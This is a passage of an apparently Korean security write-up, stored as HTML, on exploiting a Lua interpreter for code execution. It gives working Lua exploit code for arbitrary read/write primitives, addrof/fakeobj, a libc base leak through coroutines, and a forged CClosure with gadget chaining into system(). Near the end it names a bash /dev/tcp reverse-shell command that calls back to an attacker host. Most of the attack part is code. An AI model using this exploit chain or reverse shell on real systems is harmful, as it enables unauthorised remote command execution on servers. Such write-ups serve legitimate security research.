<code>node</code> &#xD544;&#xB4DC;&#xB294; <code>tt</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xC5B4; 3(<code>LUA_TNUMBER</code>) &#xAC12;&#xC774; &#xC4F0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB85C; &#xC778;&#xD55C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; <code>owow_array1</code>&#xC744; &#xD1B5;&#xD574; <code>node</code> &#xD544;&#xB4DC;&#xB97C; <code>NULL</code>&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;. <code>owow_array1</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xAC00; <code>fake_array_base - 8</code>&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 0x8&#xB85C; &#xB05D;&#xB098;&#xB294; &#xD799; &#xC8FC;&#xC18C;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>owow_array1</code>&#xB3C4; <code>fake_array</code>&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; <code>sizearray</code> &#xD544;&#xB4DC;&#xB97C; 0x7fffffff&#xB85C; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>fake_array</code>&#xC640; <code>owow_array1</code>&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xAD6C;&#xD604;&#xD55C; &#xD568;&#xC218;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">semi_aaw</span><span class="hljs-params">(addr, value)</span></span>   <span class="hljs-comment">-- Warning: This will write 0x03 (qword) tag at addr + 8.</span>   <span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x20</span> - fake_array_base) / <span class="hljs-number">0x10</span>)   fake_array[<span class="hljs-number">1</span> + ofs] = struct.<span class="hljs-built_in">unpack</span>(<span class="hljs-string">&apos;d&apos;</span>, p64(addr))   owow_array1[<span class="hljs-number">1</span>] = value<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">semi_aar</span><span class="hljs-params">(addr)</span></span>   <span class="hljs-comment">-- Warning: This requires 0x03 (qword) tag at addr + 8.</span>   <span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x20</span> - fake_array_base) / <span class="hljs-number">0x10</span>)   fake_array[<span class="hljs-number">1</span> + ofs] = struct.<span class="hljs-built_in">unpack</span>(<span class="hljs-string">&apos;d&apos;</span>, p64(addr))   <span class="hljs-keyword">return</span> owow_array1[<span class="hljs-number">1</span>]<span class="hljs-keyword">end</span></code></pre><p><code>semi_aaw</code>&#xB294; <code>fake_array</code>&#xB97C; &#xD1B5;&#xD574; <code>owow_array1</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xB97C; &#xC4F0;&#xACE0;&#xC790; &#xD558;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; <code>owow_array1[1] = value</code>&#xB85C; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xD2B9;&#xC815; &#xAC12;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xACE0; <code>semi_aar</code>&#xB3C4; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC73C;&#xB098; &#xC77D;&#xACE0;&#xC790; &#xD558;&#xB294; &#xC8FC;&#xC18C; + 0x8&#xC774; <code>TValue.tt</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC758; &#xAC12;&#xC774; 3(<code>LUA_TNUMBER</code>)&#xC77C; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="6-addrof-amp-fakeobj"><a href="#6-addrof-amp-fakeobj" class="headerlink" title="6. addrof &amp; fakeobj"></a>6. addrof &amp; fakeobj</h3><p>&#xAE30;&#xC874;&#xC758; <code>addrof</code>&#xB294; <code>tostring</code> &#xD568;&#xC218;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xB098; &#xC22B;&#xC790;&#xC640; &#xAC19;&#xC740; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xB294; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>semi_aar</code>&#xACFC; <code>semi_aaw</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; &#xD0C0;&#xC785;&#xC5D0; &#xB300;&#xD574; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xB294; <code>addrof</code>&#xB97C; &#xC7AC;&#xC815;&#xC758;&#xD558;&#xACE0; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xC704;&#xD574; Fake Closure &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4; &#xB54C; &#xC0AC;&#xC6A9;&#xD560; <code>fakeobj</code>&#xD568;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">semi_aaw(addrof(leaker_array) + <span class="hljs-number">0x28</span>, int_to_double(<span class="hljs-number">3</span>)) <span class="hljs-comment">-- LUA_TNUMBER</span><span class="hljs-keyword">local</span> leaker_array_array_addr = double_to_int(semi_aar(addrof(leaker_array) + <span class="hljs-number">0x20</span>)) <span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrof</span><span class="hljs-params">(obj)</span></span>   leaker_array[<span class="hljs-number">1</span>] = obj   semi_aaw(leaker_array_array_addr + <span class="hljs-number">8</span>, int_to_double(<span class="hljs-number">3</span>))   <span class="hljs-keyword">return</span> double_to_int(semi_aar(leaker_array_array_addr))<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeobj</span><span class="hljs-params">(addr, tt)</span></span>   semi_aaw(leaker_array_array_addr, int_to_double(addr))   semi_aaw(leaker_array_array_addr + <span class="hljs-number">8</span>, int_to_double(tt))   <span class="hljs-keyword">return</span> leaker_array[<span class="hljs-number">1</span>]<span class="hljs-keyword">end</span></code></pre><p><code>leaker_array</code>&#xB294; &#xC0AC;&#xC804;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>Table</code>&#xB85C; <code>owow_array1</code>&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; <code>fake_array_base</code>&#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. <code>addrof</code> &#xAD6C;&#xD604;&#xC744; &#xC704;&#xD574; &#xBA3C;&#xC800; <code>leaker_array</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xAC12;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. <code>semi_aaw</code>&#xB85C; <code>leaker_array</code>&#xC758; <code>node</code> &#xD544;&#xB4DC;&#xC5D0; 3&#xC744; &#xC4F0;&#xBA74; <code>semi_aar</code>&#xB85C; <code>leaker_array</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xB97C; &#xC77D;&#xC744; &#xB54C; 3&#xC774; <code>Value.tt</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xBA74;&#xC11C; <code>array</code> &#xC8FC;&#xC18C;&#xAC00; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>addrof</code>&#xC5D0;&#xC11C;&#xB294; <code>leaker_array[1]</code>&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB123;&#xACE0; <code>leaker_array</code>&#xC758; <code>array</code> + 8&#xC758; &#xC8FC;&#xC18C;&#xC5D0; 3(<code>LUA_TNUMBER</code>)&#xC744; &#xC501;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>semi_aar</code>&#xB85C; <code>leaker_array</code>&#xC758; <code>array</code>&#xB97C; &#xC77D;&#xC73C;&#xBA74; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>fakeobj</code> &#xD568;&#xC218;&#xB294; <code>semi_aaw</code>&#xB85C; <code>leaker_array[1]</code>&#xC5D0; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xD0C0;&#xC785;&#xC744; &#xC4F4; &#xB2E4;&#xC74C; &#xC774;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; Fake &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="7-Leak-Library-base"><a href="#7-Leak-Library-base" class="headerlink" title="7. Leak Library base"></a>7. Leak Library base</h3><p>&#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; gadget&#xACFC; &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; libc base &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find_libc_base</span><span class="hljs-params">(leak)</span></span>     leak = leak - (leak % <span class="hljs-number">0x1000</span>)     <span class="hljs-comment">-- while read_i64_at(leak) ~= 0x03010102464c4580 do</span>     <span class="hljs-keyword">while</span> read_i32_at(leak) ~= <span class="hljs-number">0x464c457f</span> <span class="hljs-keyword">do</span>         leak = leak - <span class="hljs-number">0x1000</span>     <span class="hljs-keyword">end</span>     <span class="hljs-keyword">return</span> leak <span class="hljs-keyword">end</span> ... <span class="hljs-keyword">local</span> stack_leak = <span class="hljs-number">0</span> <span class="hljs-keyword">local</span> libc_leak = <span class="hljs-number">0</span> <span class="hljs-keyword">local</span> coro = <span class="hljs-string">&apos;xxx&apos;</span> <span class="hljs-keyword">local</span> coro_fn = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>     <span class="hljs-keyword">local</span> coro_addr = addrof(coro)     stack_leak = read_i64_at(coro_addr + <span class="hljs-number">0xa8</span>)     <span class="hljs-comment">-- libc_leak  = read_i64_at(stack_leak + 0x88)</span>     <span class="hljs-keyword">local</span> i = <span class="hljs-number">0</span>     <span class="hljs-keyword">while</span> libc_leak == <span class="hljs-number">0</span> <span class="hljs-keyword">do</span>         <span class="hljs-keyword">local</span> cand = read_i64_at(stack_leak + i * <span class="hljs-number">8</span>)         i = i + <span class="hljs-number">1</span>         <span class="hljs-keyword">if</span> cand &gt; <span class="hljs-number">0x7f0000000000</span> <span class="hljs-keyword">and</span> cand &lt; <span class="hljs-number">0x800000000000</span> <span class="hljs-keyword">then</span>             libc_leak = cand             <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">yield</span>()         <span class="hljs-keyword">end</span>     <span class="hljs-keyword">end</span> <span class="hljs-keyword">end</span> coro = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(coro_fn) <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> can_read(addrof(coro)) <span class="hljs-keyword">do</span>     coro = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(coro_fn) <span class="hljs-keyword">end</span> <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">resume</span>(coro) <span class="hljs-keyword">local</span> libc_base = find_libc_base(libc_leak)</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; coroutine&#xC744; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0B8; &#xB2E4;&#xC74C; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xC77D;&#xC740; &#xB370;&#xC774;&#xD130; &#xC911; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xCD94;&#xCE21;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>find_libc_base</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;</p><p>&#xC720;&#xCD9C;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC8FC;&#xC18C;&#xC758; &#xCD5C;&#xD558;&#xC704; 12&#xBE44;&#xD2B8;&#xB97C; &#xBAA8;&#xB450; 0&#xC73C;&#xB85C; &#xBC14;&#xAFBC; &#xB2E4;&#xC74C; 4&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC77D;&#xACE0; ELF &#xD30C;&#xC77C;&#xC758; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xC640; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="8-Create-Fake-Function"><a href="#8-Create-Fake-Function" class="headerlink" title="8. Create Fake Function"></a>8. Create Fake Function</h3><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC740; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; gadget &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xACE0; <code>fakeobj</code>&#xB85C; Fake <code>Closure</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> system_addr = resolve_symbol_gnu(libc_leak, <span class="hljs-string">&quot;system&quot;</span>)<span class="hljs-comment">-- error(&quot;system at &quot; .. string.format(&quot;0x%x&quot;, system_addr))</span><span class="hljs-keyword">local</span> libc_base = find_libc_base(libc_leak)<span class="hljs-keyword">local</span> finder = read_str_at(libc_base, <span class="hljs-number">0x150000</span>)<span class="hljs-comment">-- mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10];</span><span class="hljs-keyword">local</span> start_index, end_index = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(finder, <span class="hljs-string">&quot;\72\139\56\72\139\71\56\255\80\16&quot;</span>)<span class="hljs-keyword">local</span> gadget1 = libc_base + start_index - <span class="hljs-number">1</span><span class="hljs-comment">-- error(&quot;gadget1 at &quot; .. string.format(&quot;0x%x&quot;, gadget1))</span><span class="hljs-comment">-- call qword ptr [rax + 0x18];</span><span class="hljs-keyword">local</span> start_index, end_index = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(finder, <span class="hljs-string">&quot;\255\80\24&quot;</span>)<span class="hljs-keyword">local</span> gadget2 = libc_base + start_index - <span class="hljs-number">1</span><span class="hljs-comment">-- error(&quot;gadget2 at &quot; .. string.format(&quot;0x%x&quot;, gadget1))</span><span class="hljs-keyword">local</span> ptr_ptr = (p64(gadget2) .. p64(system_addr))<span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&quot;[CMD]&quot;</span><span class="hljs-keyword">local</span> arg1 = (    cmd    .. <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-number">56</span>-#cmd)    .. p64(addrof(ptr_ptr) + <span class="hljs-number">0x18</span> - <span class="hljs-number">0x10</span>)    .. p64(<span class="hljs-number">0</span>) )<span class="hljs-keyword">local</span> fake_function = (   p64(addrof(arg1) + <span class="hljs-number">0x18</span>) <span class="hljs-comment">-- 00h</span>   .. p64(<span class="hljs-number">0x010106</span>)   .. p64(<span class="hljs-number">0</span>)   .. p64(<span class="hljs-number">0</span>)   .. p64(gadget1)   .. p64(<span class="hljs-number">0</span>)   .. p64(<span class="hljs-number">0</span>)   .. p64(<span class="hljs-number">0</span>))<span class="hljs-keyword">local</span> fake_function = fakeobj(addrof(fake_function) + <span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>)fake_function()</code></pre><p>Lua&#xC5D0;&#xC11C;&#xB294; &#xD568;&#xC218; &#xB610;&#xD55C; &#xD558;&#xB098;&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;(<code>Closure</code>)&#xB85C; &#xB2E4;&#xB8E8;&#xACE0; &#xC774;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ClosureHeader \</span>&#xA0; &#xA0; &#xA0; &#xA0; CommonHeader; lu_byte isC; lu_byte nupvalues; GCObject *gclist; \&#xA0; &#xA0; &#xA0; &#xA0; <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> *<span class="hljs-title">env</span></span><span class="hljs-class"><span class="hljs-title">typedef</span> <span class="hljs-title">struct</span> <span class="hljs-title">CClosure</span> {</span>&#xA0; ClosureHeader;<span class="hljs-comment">//CommonHeader</span>  <span class="hljs-comment">//GCObject *next;</span>  <span class="hljs-comment">//lu_byte tt;</span>  <span class="hljs-comment">//lu_byte marked;</span>  <span class="hljs-comment">//lu_byte isC;</span>  <span class="hljs-comment">//lu_byte nupvalues</span>  <span class="hljs-comment">//GCObject *gclist</span>  <span class="hljs-comment">//struct Table *env</span>  &#xA0; lua_CFunction f;&#xA0; TValue upvalue[<span class="hljs-number">1</span>];} CClosure;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LClosure</span> {</span>&#xA0; ClosureHeader;&#xA0; <span class="hljs-comment">//CommonHeader</span><span class="hljs-comment">//GCObject *next;</span>  <span class="hljs-comment">//lu_byte tt;</span>  <span class="hljs-comment">//lu_byte marked;</span>  <span class="hljs-comment">//lu_byte isC;</span>  <span class="hljs-comment">//lu_byte nupvalues</span>  <span class="hljs-comment">//GCObject *gclist</span>  <span class="hljs-comment">//struct Table *env</span>  &#xA0; <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Proto</span> *<span class="hljs-title">p</span>;</span>&#xA0; UpVal *upvals[<span class="hljs-number">1</span>];} LClosure;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> Closure {&#xA0; CClosure c;&#xA0; LClosure l;} Closure;</code></pre><p><code>Closure</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB294; C built-in &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>CClosure</code>&#xC640; Lua &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>LClosure</code>&#xC758; &#xACF5;&#xC6A9;&#xCCB4;&#xB85C; <code>ClosureHeader</code>&#xC758; <code>isC</code> &#xD544;&#xB4DC;&#xC758; &#xAC12;&#xC5D0; &#xB530;&#xB77C; <code>CClosure</code>&#xB098; <code>LClosure</code>&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xAD6C;&#xC870;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC5EC; &#xC815;&#xC758;&#xB41C; <code>fake_function</code>&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs lua"><span class="hljs-comment">-- gadget1 : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10];</span><span class="hljs-keyword">local</span> fake_function = (    p64(addrof(arg1) + <span class="hljs-number">0x18</span>) <span class="hljs-comment">-- 00h</span>    .. p64(<span class="hljs-number">0x010106</span>) <span class="hljs-comment">-- tt:6(LUA_TFUNCTION), marked:1, isC:1</span>    .. p64(<span class="hljs-number">0</span>)    .. p64(<span class="hljs-number">0</span>)    .. p64(gadget1) <span class="hljs-comment">-- lua_CFunction f:gadget1</span>    .. p64(<span class="hljs-number">0</span>)    .. p64(<span class="hljs-number">0</span>)    .. p64(<span class="hljs-number">0</span>))</code></pre><p><code>fake_function</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xBA74; <code>gadget1</code>&#xC774; &#xC2E4;&#xD589;&#xB420; &#xAC83;&#xC774;&#xACE0; &#xC774;&#xB54C; rax&#xB294; &#xD638;&#xCD9C;&#xB41C; <code>CClosure</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; <code>gadget1</code>&#xC5D0;&#xC11C; <code>mov rdi, qword ptr [rax];</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xBA3C;&#xC800; rdi&#xC5D0; <code>arg1</code>&#xC758; &#xC8FC;&#xC18C; + 0x18&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. Lua&#xC5D0;&#xC11C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; <code>TString</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xBB38;&#xC790;&#xC5F4; &#xB370;&#xC774;&#xD130;&#xB294; &#xAD6C;&#xC870;&#xCCB4; &#xBC14;&#xB85C; &#xB2E4;&#xC74C;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> TString {  L_Umaxalign dummy;  <span class="hljs-comment">/* ensures maximum alignment for strings */</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    CommonHeader;    lu_byte reserved;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> hash;    <span class="hljs-keyword">size_t</span> len;  } tsv;} TString;</code></pre><p>&#xADF8;&#xB807;&#xAE30;&#xC5D0; rdi&#xC5D0;&#xB294; <code>arg1</code>&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC778; <code>cmd .. string.rep(&quot;\0&quot;, 56-#cmd) .. p64(addrof(ptr_ptr) + 0x18 - 0x10) .. p64(0)</code>&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C; <code>mov rax, qword ptr [rdi + 0x38];</code>&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; rax&#xC5D0;&#xB294; <code>ptr_ptr</code>&#xC758; &#xC8FC;&#xC18C; + 0x8&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>ptr_ptr</code>&#xC740; <code>gadget2</code>&#xC640; <code>system</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xBB38;&#xC790;&#xC5F4;&#xB85C; <code>arg1</code>&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC774;&#xB8E8;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; <code>ptr_ptr</code>&#xC758; &#xC8FC;&#xC18C; + 0x18&#xBD80;&#xD130; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>call qword ptr [rax + 0x10]</code>&#xC774; &#xC2E4;&#xD589;&#xB428;&#xC5D0; &#xB530;&#xB77C; <code>addrof(ptr_ptr) + 0x18</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>gadget2</code>&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>gadget2</code>&#xC5D0;&#xC11C;&#xB294; <code>call qword ptr [rax + 0x18]</code>&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; <code>gadget1</code>&#xC5D0; &#xC758;&#xD574; <code>ptr_ptr</code>&#xC758; &#xC8FC;&#xC18C; + 0x8&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; rax&#xC5D0; 0x18&#xC744; &#xB354;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0;&#xB294; <code>system</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;</p><pre><code class="hljs c">system(<span class="hljs-string">&quot;[CMD]&quot;</span>)</code></pre><p>&#xC2E4;&#xD589;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB294; <code>local cmd = &quot;[CMD]&quot;</code>&#xB85C; &#xC815;&#xC758;&#xB41C; <code>cmd</code>&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xC815;&#xD574;&#xC9C0;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774; &#xBD80;&#xBD84;&#xC774; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; python &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; <code>bash -c &apos;bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1&apos;</code>&#xB85C; &#xB300;&#xCCB4;&#xB418;&#xBA74;&#xC11C; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD560; 